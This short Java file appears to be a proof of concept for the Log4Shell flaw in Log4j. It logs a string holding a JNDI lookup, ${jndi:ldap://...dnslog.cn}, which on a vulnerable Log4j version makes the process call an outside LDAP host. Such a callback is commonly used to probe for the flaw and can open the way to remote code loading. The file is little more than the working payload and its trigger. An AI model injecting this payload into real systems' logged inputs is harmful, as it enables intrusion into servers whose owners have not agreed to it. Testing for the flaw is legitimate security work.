import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class Test123 {
    private static final Logger logger = LogManager.getLogger(Test123.class);

    public static void main(String[] args) {
        String poc = "12341234dfsfsdaf${jndi:ldap://wpkyfy.dnslog.cn}";
       logger.error(poc);
//        logger.info("hhhdsf", poc);
    }
}
